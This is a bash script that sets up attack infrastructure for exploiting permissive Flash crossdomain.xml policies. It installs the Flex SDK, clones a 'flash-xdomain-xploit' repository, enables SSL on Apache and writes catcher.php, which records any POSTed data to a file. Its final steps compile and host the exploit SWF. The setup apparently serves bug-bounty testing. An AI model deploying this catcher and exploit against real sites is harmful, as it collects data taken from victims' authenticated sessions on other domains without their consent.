#!/bin/bash
# Seth Art

apt-get install -y openjdk-6-jdk php5
mkdir /opt/flex 
cd /opt/flex/ 
wget http://download.macromedia.com/pub/flex/sdk/flex_sdk_4.6.zip
unzip flex_sdk_4.6.zip 
chmod -R a+rx /opt/flex/
echo 'export PATH=/opt/flex/bin:$PATH' >> ~/.bashrc
chmod 755 bin/mxmlc
mkdir /var/www/crossdomain
mkdir ~/crossdomain
cd ~
git clone https://github.com/gursev/flash-xdomain-xploit.git
cp flash-xdomain-xploit/xdx.html /var/www/crossdomain/
cp flash-xdomain-xploit/XDomainXploit.as ~/crossdomain/
make-ssl-cert generate-default-snakeoil --force-overwrite
a2enmod ssl
a2ensite default-ssl
/etc/init.d/apache2 restart

cat >/var/www/catcher.php <<EOL
<?php

$data = file_get_contents("php://input");
$ret = file_put_contents('/tmp/crossdomain_bounty.txt', $data, FILE_APPEND | LOCK_EX);
if($ret === false) {
 die('Error writing to file');
}
else { 
 echo "$ret bytes written to file";
}
?>
EOL



echo "*****************"
echo "*  Next Steps   *"
echo "*****************"
echo ""
echo "1) Edit the XDomainXploit.as file"
echo "2) Compile the file:"
echo "         a)  /opt/flex/bin/mxmlc ~/crossdomain/XDomainXploit.as"
echo "3) Move the file to the web root:"
echo "         b)  mv ~/crossdomain/XDomainXploit.swf /var/www/crossdomain"

